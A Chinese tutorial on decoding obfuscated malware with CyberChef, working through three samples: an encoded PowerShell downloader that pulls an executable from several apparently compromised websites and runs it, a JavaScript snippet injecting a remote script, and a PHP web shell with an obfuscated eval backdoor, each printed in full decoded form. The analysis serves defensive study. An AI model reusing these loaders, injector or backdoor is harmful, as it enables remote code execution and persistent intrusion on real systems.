# CyberChef介绍
>CyberChef是一款强大的编码转换器，简单易懂易上手，它集成了多种编码转换的功能，如：base64加解密、hex转换、char转换、正则表达式等，能辅助大家方便快捷地解密出恶意的脚本。

# 参考链接
https://www.freebuf.com/sectool/209290.html
CyberChef地址:https://gchq.github.io/CyberChef

# 牛刀小试
下面是一段编码后的powershell，让其复原成原来的形状
```powershell
powershell -e PAAjACAAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AbQBpAGMAcgBvAHMAbwBmAHQALgBjAG8AbQAvACAAIwA+ACAAJABSAGEAcwB1AHoAbgBiAGUAbwBhAGMAeQBuAD0AJwBEAHMAcQBlAGQAcQBoAGgAZAAnADsAJABZAHIAcQBpAGsAagBmAGkAegAgAD0AIAAnADgAOQA1ACcAOwAkAEkAbwBpAHEAYgB1AG4AYQBrAGcAZQA9ACcARQBzAGUAZQB3AHMAZABiACcAOwAkAE4AegBiAGgAbgBzAGsAegB5AHEAbwBmAHcAPQAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlACsAJwBcACcAKwAkAFkAcgBxAGkAawBqAGYAaQB6ACsAJwAuAGUAeABlACcAOwAkAE0AcwB2AGoAaQBqAHMAcAB3AD0AJwBUAHAAZwBqAGEAZAB6AGYAdwB3AG4AeQBkACcAOwAkAFIAaABiAG0AdwBwAHMAdwBuAHMAbgB1AGkAPQAmACgAJwBuAGUAdwAnACsAJwAtAG8AYgBqAGUAJwArACcAYwAnACsAJwB0ACcAKQAgAG4ARQBUAC4AdwBlAEIAYwBMAEkARQBuAFQAOwAkAFUAYwBiAGEAZQBmAGEAeQBxAGQAPQAnAGgAdAB0AHAAOgAvAC8AZgBsAGEAbQBpAG4AZwBvAGgAbwBuAHUAaQBjAG8AYwAuAGMAbwBtAC8AdwBwAC0AYQBkAG0AaQBuAC8AagBzAC8AdwBpAGQAZwBlAHQAcwAvAGgAOQA1AGQAdQAvACoAaAB0AHQAcABzADoALwAvAGMAYQBuAGMAZQByAGMAbAB1AGIAYwBpAHMAYwAuAG8AcgBnAC8AdwBwAC0AYQBkAG0AaQBuAC8AMABrAGIAMgB3AGcAMQAvACoAaAB0AHQAcAA6AC8ALwB3AHcAdwAuAG0AbwBuAGUAeQBoAGEAaQByAHAAYQByAHQAeQAuAGMAbwBtAC8AYwBsAGEAcwBzAC4AbABvAGMAYQBsAC8AcABhAHIAdABzAF8AcwBlAHIAdgBpAGMAZQAvAEQAMQBDAEEAdgAvACoAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AYgBpAG8AYgBoAGEAcgBhAHQAaQAuAGMAbwBtAC8AdwBwAC0AYwBvAG4AdABlAG4AdAAvAHoANgBnAC8AKgBoAHQAdABwADoALwAvAGwAYQBnAHIAaQBmAGYAZQBkAHUAdwBlAGIALgBjAG8AbQAvAGMAbABpAGUAbgB0AHMALwA5AGIANABkAGoAcgBtAC8AJwAuACIAcwBQAGAATABJAFQAIgAoACcAKgAnACkAOwAkAEQAZABnAGUAbQBtAGUAaQB2AHkAZwBsAGUAPQAnAFIAaABpAGIAbABjAHkAdQB2AHAAZAB2ACcAOwBmAG8AcgBlAGEAYwBoACgAJABTAGoAbgBhAG0AYgBvAGcAdwAgAGkAbgAgACQAVQBjAGIAYQBlAGYAYQB5AHEAZAApAHsAdAByAHkAewAkAFIAaABiAG0AdwBwAHMAdwBuAHMAbgB1AGkALgAiAGQATwBXAG4AYABMAE8AYABBAGAARABGAEkAbABFACIAKAAkAFMAagBuAGEAbQBiAG8AZwB3ACwAIAAkAE4AegBiAGgAbgBzAGsAegB5AHEAbwBmAHcAKQA7ACQAWQB1AHMAagBrAGcAbwBpAHMAdwA9ACcASABrAGwAdQBzAHYAcABlAGYAZwBwACcAOwBJAGYAIAAoACgAJgAoACcARwBlAHQALQBJACcAKwAnAHQAJwArACcAZQBtACcAKQAgACQATgB6AGIAaABuAHMAawB6AHkAcQBvAGYAdwApAC4AIgBMAGUAbgBgAGcAVABIACIAIAAtAGcAZQAgADIAMQA1ADQAMQApACAAewBbAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAIgBTAHQAQQBgAFIAdAAiACgAJABOAHoAYgBoAG4AcwBrAHoAeQBxAG8AZgB3ACkAOwAkAEYAaQBsAG8AaQBxAHcAeQB4AGQAbwBiAHQAPQAnAEkAcABsAG4AdwB2AG8AaQAnADsAYgByAGUAYQBrADsAJABJAGcAZABlAHMAZQBxAHYAbwBiAGcAeABkAD0AJwBTAGkAbQBpAGcAcQBiAGUAYgB4AHIAZABvACcAfQB9AGMAYQB0AGMAaAB7AH0AfQAkAFEAegBrAHIAegBqAHMAdQA9ACcAWABnAGYAagB3AGsAbAB4AHEAZABuAGIAYQAnAA==
```

![](_v_images/20191024144328900_29487.png)

输入正则```[0-9-a-z-A-Z,+,=]{30,}```匹配出base64
![](_v_images/20191024144557053_20660.png)

我们可以选择List matches将匹配出来的截取
![](_v_images/20191024144703669_29787.png)

将Form Base64拖动出来，进行解码
![](_v_images/20191024144753909_26166.png)

这样显示太丑了，进行美化一下
![](_v_images/20191024145058285_1511.png)


最后得到解码的代码
```powershell
 < # https://www.microsoft.com /  # >  $Rasuznbeoacyn = 'Dsqedqhhd';
$Yrqikjfiz  =  '895';
$Ioiqbunakge = 'Eseewsdb';
$Nzbhnskzyqofw = $env:userprofile + '\' + $Yrqikjfiz + '.exe';
$Msvjijspw = 'Tpgjadzfwwnyd';
$Rhbmwpswnsnui = &('new' + '-obje' + 'c' + 't') nET.weBcLIEnT;
$Ucbaefayqd = 'http://flamingohonuicoc.com/wp-admin/js/widgets/h95du/*https://cancerclubcisc.org/wp-admin/0kb2wg1/*http://www.moneyhairparty.com/class.local/parts_service/D1CAv/*https://www.biobharati.com/wp-content/z6g/*http://lagriffeduweb.com/clients/9b4djrm/'."sP`LIT"('*');
$Ddgemmeivygle = 'Rhiblcyuvpdv';
foreach($Sjnambogw in $Ucbaefayqd) {
    try {
        $Rhbmwpswnsnui."dOWn`LO`A`DFIlE"($Sjnambogw,  $Nzbhnskzyqofw);
        $Yusjkgoisw = 'Hklusvpefgp';
        If ((&('Get-I' + 't' + 'em') $Nzbhnskzyqofw)."Len`gTH"  - ge 21541)  {
            [Diagnostics.Process]::"StA`Rt"($Nzbhnskzyqofw);
            $Filoiqwyxdobt = 'Iplnwvoi';
            break;
            $Igdeseqvobgxd = 'Simigqbebxrdo'
        }

        
    }

    catch {
        
    }

    
}

$Qzkrzjsu = 'Xgfjwklxqdnba'
```


# 牛刀中试
样本地址：https://gist.github.com/jonmarkgo/3431818
解密这些chr字符
![](_v_images/20191024150120367_25596.png)


![](_v_images/20191024150441557_31603.png)


解密出的js是
```javascript
ar somestring = document.createElement('script');
somestring.type = 'text/javascript';
somestring.async = true;
somestring.src = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 101, 120, 97, 109, 104, 111, 109, 101, 46, 110, 101, 116, 47, 115, 116, 97, 116, 46, 106, 115, 63, 118, 61, 49, 46, 48, 46, 49);
var alls = document.getElementsByTagName('script');
var nt3 = true;
for ( var i = alls.length;
i--;
) {
    if (alls[i].src.indexOf(String.fromCharCode(101, 120, 97, 109, 104, 111, 109, 101)) >  - 1)  {
        nt3 = false;
    }

}

if (nt3 == true)  {
    document.getElementsByTagName("head")[0].appendChild(somestring);
}
```

# 屠牛
样本地址：https://github.com/LordWolfer/webshells/blob/b7eefaff64049e3ff61e90c850686135c0ba74c4/from_the_wild1.php
![](_v_images/20191024151523461_9305.png)


如果有几十次这种base64加密，每次这么弄岂不是吃屎。CyberChef提供了一种循环的方法，可以省去手工操作的工作。首先在powershell-deflate-base64的开头加个Label，自定义命名为start，意思指循环的开始
![](_v_images/20191024151750653_3697.png)

在结尾拖入jump，jump的地址指向start，Maximum jumps填入要循环的次数。
![](_v_images/20191024152020677_18878.png)


然后在格式化一波代码
![](_v_images/20191024152105437_29515.png)


得到源码
```php
@error_reporting(0);
@ini_set("display_errors", 0);
@ini_set("log_errors", 0);
@ini_set("error_log", 0);
if (isset($_GET['r']))  {
    print $_GET['r'];
} elseif (isset($_POST['e']))  {
    eval(base64_decode(str_rot13(strrev(base64_decode(str_rot13($_POST['e']))))));
} elseif (isset($_SERVER['HTTP_CONTENT_ENCODING']) && $_SERVER['HTTP_CONTENT_ENCODING'] == 'binary')  {
    $data = file_get_contents('php://input');
    if (strlen($data) > 0)  print 'STATUS-IMPORT-OK';
    if (strlen($data) > 12)  {
        $fp = @fopen('tmpfile', 'a');
        @flock($fp, LOCK_EX);
        @fputs($fp, $_SERVER['REMOTE_ADDR']."\t".base64_encode($data)."\r\n");
        @flock($fp, LOCK_UN);
        @fclose($fp);
    }

}

exit;
```